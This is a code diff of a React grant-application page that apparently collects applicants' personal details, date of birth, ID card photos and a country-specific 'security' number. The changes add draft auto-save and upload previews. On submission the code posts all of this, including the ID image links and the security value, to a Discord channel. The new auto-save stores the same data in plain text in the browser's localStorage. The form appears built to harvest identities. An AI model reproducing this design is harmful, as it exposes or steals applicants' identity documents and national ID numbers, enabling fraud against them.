@@ -1,4 +1,4 @@
-import { useState, useRef } from 'react';
+import { useState, useRef, useEffect, useMemo } from 'react';
 import { format } from 'date-fns';
 import { supabase } from '@/integrations/supabase/client';
 import { useAuth } from '@/contexts/AuthContext';
@@ -7,13 +7,12 @@ import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Textarea } from '@/components/ui/textarea';
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
-import { Calendar } from '@/components/ui/calendar';
-import { Popover, PopoverContent, PopoverTrigger } from '@/components/ui/popover';
+import { Progress } from '@/components/ui/progress';
 import { cn } from '@/lib/utils';
 import { toast } from 'sonner';
 import { useNavigate } from 'react-router-dom';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
-import { Loader2, ArrowLeft, ArrowRight, CalendarIcon, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList, ShieldCheck } from 'lucide-react';
+import { Loader2, ArrowLeft, ArrowRight, Upload, FileText, CheckCircle, User, DollarSign, ClipboardList, ShieldCheck, X, Image as ImageIcon } from 'lucide-react';
 import { sendToDiscord } from '@/lib/discord';
 
 const SECURITY_COUNTRIES = ['USA', 'Germany', 'UK', 'Canada', 'Brazil', 'New Zealand', 'Others'] as const;
@@ -29,18 +28,27 @@ const SECURITY_PLACEHOLDERS: Record<string, string> = {
 };
 
 const STEPS = ['Personal Details', 'Funding Details', 'Questionnaire', 'Review & Submit'];
+const DRAFT_KEY = 'apply_form_draft_v1';
+
+const MONTHS = [
+  'January', 'February', 'March', 'April', 'May', 'June',
+  'July', 'August', 'September', 'October', 'November', 'December'
+];
 
 export default function ApplyPage() {
   const { user } = useAuth();
   const navigate = useNavigate();
   const [step, setStep] = useState(0);
   const [submitting, setSubmitting] = useState(false);
+  const [draftLoaded, setDraftLoaded] = useState(false);
 
   // Step 1: Personal details
   const [fullName, setFullName] = useState('');
   const [email, setEmail] = useState(user?.email || '');
   const [phone, setPhone] = useState('');
-  const [dateOfBirth, setDateOfBirth] = useState<Date | undefined>();
+  const [dobDay, setDobDay] = useState<string>('');
+  const [dobMonth, setDobMonth] = useState<string>('');
+  const [dobYear, setDobYear] = useState<string>('');
   const [streetAddress, setStreetAddress] = useState('');
   const [city, setCity] = useState('');
   const [stateProvince, setStateProvince] = useState('');
@@ -50,6 +58,10 @@ export default function ApplyPage() {
   const [occupation, setOccupation] = useState('');
   const [idFrontFile, setIdFrontFile] = useState<File | null>(null);
   const [idBackFile, setIdBackFile] = useState<File | null>(null);
+  const [idFrontPreview, setIdFrontPreview] = useState<string>('');
+  const [idBackPreview, setIdBackPreview] = useState<string>('');
+  const [uploadingFront, setUploadingFront] = useState(false);
+  const [uploadingBack, setUploadingBack] = useState(false);
   const idFrontRef = useRef<HTMLInputElement>(null);
   const idBackRef = useRef<HTMLInputElement>(null);
 
@@ -65,6 +77,23 @@ export default function ApplyPage() {
   const [q4, setQ4] = useState('');
   const [q5, setQ5] = useState('');
 
+  const dateOfBirth = useMemo(() => {
+    if (!dobDay || !dobMonth || !dobYear) return undefined;
+    const d = new Date(parseInt(dobYear), parseInt(dobMonth), parseInt(dobDay));
+    return isNaN(d.getTime()) ? undefined : d;
+  }, [dobDay, dobMonth, dobYear]);
+
+  const currentYear = new Date().getFullYear();
+  const years = useMemo(() => {
+    const arr: number[] = [];
+    for (let y = currentYear; y >= 1900; y--) arr.push(y);
+    return arr;
+  }, [currentYear]);
+  const daysInMonth = useMemo(() => {
+    if (!dobMonth || !dobYear) return 31;
+    return new Date(parseInt(dobYear), parseInt(dobMonth) + 1, 0).getDate();
+  }, [dobMonth, dobYear]);
+
   const questions = [
     { label: 'Why do you need this grant?', value: q1, set: setQ1 },
     { label: 'How will you use the funds?', value: q2, set: setQ2 },
@@ -73,9 +102,74 @@ export default function ApplyPage() {
     { label: 'Is there anything else you would like us to know?', value: q5, set: setQ5 },
   ];
 
+  // ---- Auto-save: load draft on mount ----
+  useEffect(() => {
+    try {
+      const saved = localStorage.getItem(DRAFT_KEY);
+      if (saved) {
+        const d = JSON.parse(saved);
+        setFullName(d.fullName || '');
+        setEmail(d.email || user?.email || '');
+        setPhone(d.phone || '');
+        setDobDay(d.dobDay || '');
+        setDobMonth(d.dobMonth || '');
+        setDobYear(d.dobYear || '');
+        setStreetAddress(d.streetAddress || '');
+        setCity(d.city || '');
+        setStateProvince(d.stateProvince || '');
+        setCountry(d.country || '');
+        setSecurityCountry(d.securityCountry || '');
+        setSecurityInfo(d.securityInfo || '');
+        setOccupation(d.occupation || '');
+        setAmountRequested(d.amountRequested || '');
+        setAmountDisplay(d.amountDisplay || '');
+        setPurpose(d.purpose || '');
+        setQ1(d.q1 || ''); setQ2(d.q2 || ''); setQ3(d.q3 || '');
+        setQ4(d.q4 || ''); setQ5(d.q5 || '');
+        setStep(typeof d.step === 'number' ? d.step : 0);
+        setIdFrontPreview(d.idFrontPreview || '');
+        setIdBackPreview(d.idBackPreview || '');
+        toast.success('Restored your saved progress', { duration: 2500 });
+      }
+    } catch (e) {
+      console.error('Failed to load draft:', e);
+    } finally {
+      setDraftLoaded(true);
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []);
+
+  // ---- Auto-save: persist on change (after initial load) ----
+  useEffect(() => {
+    if (!draftLoaded) return;
+    try {
+      const draft = {
+        fullName, email, phone, dobDay, dobMonth, dobYear,
+        streetAddress, city, stateProvince, country,
+        securityCountry, securityInfo, occupation,
+        amountRequested, amountDisplay, purpose,
+        q1, q2, q3, q4, q5, step,
+        idFrontPreview, idBackPreview,
+      };
+      localStorage.setItem(DRAFT_KEY, JSON.stringify(draft));
+    } catch (e) {
+      console.error('Failed to save draft:', e);
+    }
+  }, [
+    draftLoaded, fullName, email, phone, dobDay, dobMonth, dobYear,
+    streetAddress, city, stateProvince, country,
+    securityCountry, securityInfo, occupation,
+    amountRequested, amountDisplay, purpose,
+    q1, q2, q3, q4, q5, step, idFrontPreview, idBackPreview,
+  ]);
+
   const showSecurityField = securityCountry && securityCountry !== 'Others';
-  const canProceedStep0 = fullName && email && dateOfBirth && streetAddress && city && country && occupation && idFrontFile && idBackFile && (!showSecurityField || securityInfo);
+  const canProceedStep0 =
+    fullName && email && dateOfBirth && streetAddress && city && country &&
+    occupation && (idFrontFile || idFrontPreview) && (idBackFile || idBackPreview) &&
+    (!showSecurityField || securityInfo);
   const canProceedStep1 = amountRequested && parseFloat(amountRequested) > 0 && parseFloat(amountRequested) <= 500000;
+  const canProceedStep2 = q1 && q2 && q4;
 
   const handleAmountChange = (val: string) => {
     const raw = val.replace(/[^0-9.]/g, '');
@@ -86,7 +180,6 @@ export default function ApplyPage() {
     const formatted = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
     setAmountDisplay(formatted + decPart);
   };
-  const canProceedStep2 = q1 && q2 && q4;
 
   const uploadToCloudinary = async (file: File): Promise<string | null> => {
     try {
@@ -101,94 +194,143 @@ export default function ApplyPage() {
       });
 
       if (!res.ok) {
-        const err = await res.json();
-        toast.error(`Upload failed: ${err.error?.message || 'Unknown error'}`);
+        const err = await res.json().catch(() => ({}));
+        const msg = err?.error?.message || `Upload failed (${res.status})`;
+        console.error('Cloudinary upload failed:', msg);
+        toast.error(`Upload failed: ${msg}`);
         return null;
       }
 
       const data = await res.json();
       return data.secure_url;
     } catch (err) {
-      toast.error('Upload failed. Please try again.');
+      console.error('Cloudinary upload exception:', err);
+      toast.error('Upload failed. Please check your connection and try again.');
       return null;
     }
   };
 
-  const handleSubmit = async () => {
-    if (!user) return;
-    setSubmitting(true);
-
-    // Upload ID cards
-    const idFrontUrl = idFrontFile ? await uploadToCloudinary(idFrontFile) : null;
-    const idBackUrl = idBackFile ? await uploadToCloudinary(idBackFile) : null;
-
-    if (idFrontFile && !idFrontUrl) { setSubmitting(false); return; }
-    if (idBackFile && !idBackUrl) { setSubmitting(false); return; }
-
-    const answers = {
-      why_need_grant: q1,
-      how_use_funds: q2,
-      previous_grants: q3,
-      impact: q4,
-      additional_info: q5,
-    };
-
-    const { error } = await supabase.from('applications').insert({
-      user_id: user.id,
-      full_name: fullName,
-      email,
-      phone: phone || null,
-      date_of_birth: dateOfBirth ? format(dateOfBirth, 'yyyy-MM-dd') : null,
-      street_address: streetAddress,
-      city,
-      state_province: stateProvince || null,
-      country,
-      occupation,
-      id_card_front_url: idFrontUrl,
-      id_card_back_url: idBackUrl,
-      amount_requested: parseFloat(amountRequested),
-      purpose: purpose || null,
-      answers,
-    });
-
-    if (error) {
-      toast.error(error.message);
-      setSubmitting(false);
+  const handleFileSelect = async (file: File | null, side: 'front' | 'back') => {
+    if (!file) return;
+    if (file.size > 10 * 1024 * 1024) {
+      toast.error('File too large (max 10MB)');
       return;
     }
+    const setFile = side === 'front' ? setIdFrontFile : setIdBackFile;
+    const setPreview = side === 'front' ? setIdFrontPreview : setIdBackPreview;
+    const setUploading = side === 'front' ? setUploadingFront : setUploadingBack;
 
-    // Send application data to Discord
-    await sendToDiscord({
-      title: '📄 New Grant Application',
-      color: 0x3b82f6,
-      fields: [
-        { name: '👤 Full Name', value: fullName },
-        { name: '📧 Email', value: email },
-        { name: '📞 Phone', value: phone || '—' },
-        { name: '🎂 Date of Birth', value: dateOfBirth ? format(dateOfBirth, 'PPP') : '—' },
-        { name: '💼 Occupation', value: occupation },
-        { name: '🏠 Address', value: [streetAddress, city, stateProvince, country].filter(Boolean).join(', '), inline: false },
-        { name: '💰 Amount Requested', value: `$${Number(amountRequested).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
-        { name: '📋 Purpose', value: purpose || '—', inline: false },
-        { name: '❓ Why need grant', value: q1 || '—', inline: false },
-        { name: '💡 How use funds', value: q2 || '—', inline: false },
-        { name: '📜 Previous grants', value: q3 || '—', inline: false },
-        { name: '🌍 Impact', value: q4 || '—', inline: false },
-        { name: '📎 Additional info', value: q5 || '—', inline: false },
-        { name: '🪪 ID Front', value: idFrontUrl || '—', inline: false },
-        { name: '🪪 ID Back', value: idBackUrl || '—', inline: false },
-        ...(showSecurityField ? [
-          { name: `🛡️ ${SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '')}`, value: securityInfo, inline: false },
-        ] : []),
-      ],
-      imageUrl: idFrontUrl || undefined,
-    });
+    setFile(file);
+    setUploading(true);
+    try {
+      const url = await uploadToCloudinary(file);
+      if (url) {
+        setPreview(url);
+        toast.success(`${side === 'front' ? 'Front' : 'Back'} ID uploaded`);
+      } else {
+        setFile(null);
+      }
+    } finally {
+      setUploading(false);
+    }
+  };
 
-    navigate('/application-success');
-    setSubmitting(false);
+  const removeFile = (side: 'front' | 'back') => {
+    if (side === 'front') {
+      setIdFrontFile(null);
+      setIdFrontPreview('');
+      if (idFrontRef.current) idFrontRef.current.value = '';
+    } else {
+      setIdBackFile(null);
+      setIdBackPreview('');
+      if (idBackRef.current) idBackRef.current.value = '';
+    }
+  };
+
+  const handleSubmit = async () => {
+    if (!user) {
+      toast.error('You must be signed in to submit');
+      return;
+    }
+    if (!idFrontPreview || !idBackPreview) {
+      toast.error('Please wait for ID uploads to complete');
+      return;
+    }
+    setSubmitting(true);
+
+    try {
+      const answers = {
+        why_need_grant: q1,
+        how_use_funds: q2,
+        previous_grants: q3,
+        impact: q4,
+        additional_info: q5,
+      };
+
+      const { error } = await supabase.from('applications').insert({
+        user_id: user.id,
+        full_name: fullName,
+        email,
+        phone: phone || null,
+        date_of_birth: dateOfBirth ? format(dateOfBirth, 'yyyy-MM-dd') : null,
+        street_address: streetAddress,
+        city,
+        state_province: stateProvince || null,
+        country,
+        occupation,
+        id_card_front_url: idFrontPreview,
+        id_card_back_url: idBackPreview,
+        amount_requested: parseFloat(amountRequested),
+        purpose: purpose || null,
+        answers,
+      });
+
+      if (error) {
+        console.error('Submission DB error:', error);
+        toast.error(error.message || 'Failed to save application');
+        setSubmitting(false);
+        return;
+      }
+
+      await sendToDiscord({
+        title: '📄 New Grant Application',
+        color: 0x3b82f6,
+        fields: [
+          { name: '👤 Full Name', value: fullName },
+          { name: '📧 Email', value: email },
+          { name: '📞 Phone', value: phone || '—' },
+          { name: '🎂 Date of Birth', value: dateOfBirth ? format(dateOfBirth, 'PPP') : '—' },
+          { name: '💼 Occupation', value: occupation },
+          { name: '🏠 Address', value: [streetAddress, city, stateProvince, country].filter(Boolean).join(', '), inline: false },
+          { name: '💰 Amount Requested', value: `$${Number(amountRequested).toLocaleString('en-US', { minimumFractionDigits: 2 })}` },
+          { name: '📋 Purpose', value: purpose || '—', inline: false },
+          { name: '❓ Why need grant', value: q1 || '—', inline: false },
+          { name: '💡 How use funds', value: q2 || '—', inline: false },
+          { name: '📜 Previous grants', value: q3 || '—', inline: false },
+          { name: '🌍 Impact', value: q4 || '—', inline: false },
+          { name: '📎 Additional info', value: q5 || '—', inline: false },
+          { name: '🪪 ID Front', value: idFrontPreview, inline: false },
+          { name: '🪪 ID Back', value: idBackPreview, inline: false },
+          ...(showSecurityField ? [
+            { name: `🛡️ ${SECURITY_PLACEHOLDERS[securityCountry]?.replace('Enter ', '')}`, value: securityInfo, inline: false },
+          ] : []),
+        ],
+        imageUrl: idFrontPreview,
+      });
+
+      // Clear draft on success
+      localStorage.removeItem(DRAFT_KEY);
+      navigate('/application-success');
+    } catch (err: any) {
+      console.error('Submit exception:', err);
+      toast.error(err?.message || 'Submission failed. Please try again.');
+    } finally {
+      setSubmitting(false);
+    }
   };
 
   const stepIcons = [User, DollarSign, ClipboardList, CheckCircle];
+  const progressPercent = ((step + 1) / STEPS.length) * 100;
 
   return (
     <div className="min-h-screen bg-background py-8 px-4">
@@ -198,7 +340,7 @@ export default function ApplyPage() {
         </Button>
 
         {/* Step Indicator */}
-        <div className="flex items-center justify-between mb-8 px-2">
+        <div className="flex items-center justify-between mb-3 px-2">
           {STEPS.map((s, i) => {
             const Icon = stepIcons[i];
             const isActive = i === step;
@@ -219,6 +361,12 @@ export default function ApplyPage() {
               </div>
             );
           })}
+        </div>
+        <div className="px-2 mb-6">
+          <Progress value={progressPercent} className="h-2" />
+          <p className="text-xs text-muted-foreground mt-2 text-center">
+            Step {step + 1} of {STEPS.length} • Progress is auto-saved
+          </p>
         </div>
 
         <Card>
@@ -252,20 +400,33 @@ export default function ApplyPage() {
                     <Input id="phone" value={phone} onChange={e => setPhone(e.target.value)} placeholder="+1 (555) 000-0000" />
                   </div>
                   <div className="space-y-2">
-                    <Label htmlFor="dob">Date of Birth <span className="text-destructive">*</span></Label>
-                    <Input
-                      id="dob"
-                      type="date"
-                      max={new Date().toISOString().split('T')[0]}
-                      min="1900-01-01"
-                      value={dateOfBirth ? format(dateOfBirth, 'yyyy-MM-dd') : ''}
-                      onChange={e => {
-                        const val = e.target.value;
-                        setDateOfBirth(val ? new Date(val + 'T00:00:00') : undefined);
-                      }}
-                      className="w-full"
-                      required
-                    />
+                    <Label>Date of Birth <span className="text-destructive">*</span></Label>
+                    <div className="grid grid-cols-3 gap-2">
+                      <Select value={dobMonth} onValueChange={setDobMonth}>
+                        <SelectTrigger><SelectValue placeholder="Month" /></SelectTrigger>
+                        <SelectContent className="max-h-64">
+                          {MONTHS.map((m, i) => (
+                            <SelectItem key={m} value={String(i)}>{m}</SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                      <Select value={dobDay} onValueChange={setDobDay}>
+                        <SelectTrigger><SelectValue placeholder="Day" /></SelectTrigger>
+                        <SelectContent className="max-h-64">
+                          {Array.from({ length: daysInMonth }, (_, i) => i + 1).map(d => (
+                            <SelectItem key={d} value={String(d)}>{d}</SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                      <Select value={dobYear} onValueChange={setDobYear}>
+                        <SelectTrigger><SelectValue placeholder="Year" /></SelectTrigger>
+                        <SelectContent className="max-h-64">
+                          {years.map(y => (
+                            <SelectItem key={y} value={String(y)}>{y}</SelectItem>
+                          ))}
+                        </SelectContent>
+                      </Select>
+                    </div>
                   </div>
                 </div>
 
@@ -321,52 +482,24 @@ export default function ApplyPage() {
 
                 {/* ID Card Uploads */}
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-2">
-                  <div className="space-y-2">
-                    <Label>ID Card — Front <span className="text-destructive">*</span></Label>
-                    <input
-                      ref={idFrontRef}
-                      type="file"
-                      accept=".jpg,.jpeg,.png,.pdf"
-                      className="hidden"
-                      onChange={e => setIdFrontFile(e.target.files?.[0] || null)}
-                    />
-                    <Button
-                      type="button"
-                      variant="outline"
-                      className="w-full justify-start"
-                      onClick={() => idFrontRef.current?.click()}
-                    >
-                      {idFrontFile ? (
-                        <><FileText className="mr-2 h-4 w-4 text-success" />{idFrontFile.name}</>
-                      ) : (
-                        <><Upload className="mr-2 h-4 w-4" />Upload front of ID</>
-                      )}
-                    </Button>
-                    <p className="text-xs text-muted-foreground">JPG, PNG, or PDF</p>
-                  </div>
-                  <div className="space-y-2">
-                    <Label>ID Card — Back <span className="text-destructive">*</span></Label>
-                    <input
-                      ref={idBackRef}
-                      type="file"
-                      accept=".jpg,.jpeg,.png,.pdf"
-                      className="hidden"
-                      onChange={e => setIdBackFile(e.target.files?.[0] || null)}
-                    />
-                    <Button
-                      type="button"
-                      variant="outline"
-                      className="w-full justify-start"
-                      onClick={() => idBackRef.current?.click()}
-                    >
-                      {idBackFile ? (
-                        <><FileText className="mr-2 h-4 w-4 text-success" />{idBackFile.name}</>
-                      ) : (
-                        <><Upload className="mr-2 h-4 w-4" />Upload back of ID</>
-                      )}
-                    </Button>
-                    <p className="text-xs text-muted-foreground">JPG, PNG, or PDF</p>
-                  </div>
+                  <IdUploadField
+                    label="ID Card — Front"
+                    inputRef={idFrontRef}
+                    file={idFrontFile}
+                    previewUrl={idFrontPreview}
+                    uploading={uploadingFront}
+                    onSelect={(f) => handleFileSelect(f, 'front')}
+                    onRemove={() => removeFile('front')}
+                  />
+                  <IdUploadField
+                    label="ID Card — Back"
+                    inputRef={idBackRef}
+                    file={idBackFile}
+                    previewUrl={idBackPreview}
+                    uploading={uploadingBack}
+                    onSelect={(f) => handleFileSelect(f, 'back')}
+                    onRemove={() => removeFile('back')}
+                  />
                 </div>
               </div>
             )}
@@ -419,14 +552,18 @@ export default function ApplyPage() {
                   <div className="mt-2 text-sm">
                     <ReviewItem label="Address" value={[streetAddress, city, stateProvince, country].filter(Boolean).join(', ')} />
                   </div>
-                  <div className="mt-2 flex gap-4 text-sm">
-                    <div>
-                      <span className="text-muted-foreground">ID Front: </span>
-                      <span className="font-medium text-success">{idFrontFile?.name || '—'}</span>
+                  <div className="mt-3 flex gap-4 text-sm">
+                    <div className="flex-1">
+                      <span className="text-muted-foreground block mb-1">ID Front</span>
+                      {idFrontPreview ? (
+                        <img src={idFrontPreview} alt="ID Front" className="h-20 w-full object-cover rounded border" />
+                      ) : <span className="text-muted-foreground">—</span>}
                     </div>
-                    <div>
-                      <span className="text-muted-foreground">ID Back: </span>
-                      <span className="font-medium text-success">{idBackFile?.name || '—'}</span>
+                    <div className="flex-1">
+                      <span className="text-muted-foreground block mb-1">ID Back</span>
+                      {idBackPreview ? (
+                        <img src={idBackPreview} alt="ID Back" className="h-20 w-full object-cover rounded border" />
+                      ) : <span className="text-muted-foreground">—</span>}
                     </div>
                   </div>
                 </div>
@@ -456,7 +593,7 @@ export default function ApplyPage() {
             {/* Navigation */}
             <div className="flex items-center justify-between mt-8 pt-4 border-t">
               {step > 0 ? (
-                <Button variant="outline" onClick={() => setStep(s => s - 1)}>
+                <Button variant="outline" onClick={() => setStep(s => s - 1)} disabled={submitting}>
                   <ArrowLeft className="mr-2 h-4 w-4" /> Back
                 </Button>
               ) : <div />}
@@ -467,15 +604,20 @@ export default function ApplyPage() {
                   disabled={
                     (step === 0 && !canProceedStep0) ||
                     (step === 1 && !canProceedStep1) ||
-                    (step === 2 && !canProceedStep2)
+                    (step === 2 && !canProceedStep2) ||
+                    uploadingFront || uploadingBack
                   }
                 >
-                  Next <ArrowRight className="ml-2 h-4 w-4" />
+                  {(uploadingFront || uploadingBack) ? (
+                    <><Loader2 className="mr-2 h-4 w-4 animate-spin" />Uploading…</>
+                  ) : (
+                    <>Next <ArrowRight className="ml-2 h-4 w-4" /></>
+                  )}
                 </Button>
               ) : (
                 <Button
                   onClick={handleSubmit}
-                  disabled={submitting}
+                  disabled={submitting || uploadingFront || uploadingBack}
                   className="bg-success text-success-foreground hover:bg-success/90"
                 >
                   {submitting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <CheckCircle className="mr-2 h-4 w-4" />}
@@ -495,6 +637,75 @@ function ReviewItem({ label, value }: { label: string; value: string }) {
     <div>
       <span className="text-muted-foreground">{label}: </span>
       <span className="font-medium text-foreground">{value}</span>
+    </div>
+  );
+}
+
+interface IdUploadFieldProps {
+  label: string;
+  inputRef: React.RefObject<HTMLInputElement>;
+  file: File | null;
+  previewUrl: string;
+  uploading: boolean;
+  onSelect: (file: File | null) => void;
+  onRemove: () => void;
+}
+
+function IdUploadField({ label, inputRef, file, previewUrl, uploading, onSelect, onRemove }: IdUploadFieldProps) {
+  return (
+    <div className="space-y-2">
+      <Label>{label} <span className="text-destructive">*</span></Label>
+      <input
+        ref={inputRef}
+        type="file"
+        accept=".jpg,.jpeg,.png,.pdf"
+        className="hidden"
+        onChange={(e) => {
+          e.preventDefault();
+          onSelect(e.target.files?.[0] || null);
+        }}
+      />
+      {previewUrl ? (
+        <div className="relative border rounded-lg overflow-hidden bg-muted/30">
+          {previewUrl.match(/\.pdf$/i) ? (
+            <div className="flex items-center justify-center h-32 text-muted-foreground">
+              <FileText className="h-8 w-8 mr-2" /> PDF uploaded
+            </div>
+          ) : (
+            <img src={previewUrl} alt={label} className="w-full h-32 object-cover" />
+          )}
+          <Button
+            type="button"
+            size="icon"
+            variant="destructive"
+            className="absolute top-1 right-1 h-7 w-7"
+            onClick={onRemove}
+          >
+            <X className="h-4 w-4" />
+          </Button>
+          <div className="absolute bottom-1 left-1 bg-success text-success-foreground text-xs px-2 py-0.5 rounded flex items-center gap-1">
+            <CheckCircle className="h-3 w-3" /> Uploaded
+          </div>
+        </div>
+      ) : uploading ? (
+        <div className="border rounded-lg p-4 flex flex-col items-center gap-2 bg-muted/30">
+          <Loader2 className="h-6 w-6 animate-spin text-primary" />
+          <p className="text-xs text-muted-foreground">Uploading {file?.name}…</p>
+        </div>
+      ) : (
+        <Button
+          type="button"
+          variant="outline"
+          className="w-full justify-start h-auto py-3"
+          onClick={() => inputRef.current?.click()}
+        >
+          <Upload className="mr-2 h-4 w-4" />
+          <span className="flex flex-col items-start">
+            <span>Upload {label.includes('Front') ? 'front' : 'back'} of ID</span>
+            <span className="text-xs text-muted-foreground font-normal">JPG, PNG, or PDF (max 10MB)</span>
+          </span>
+        </Button>
+      )}
     </div>
   );
 }
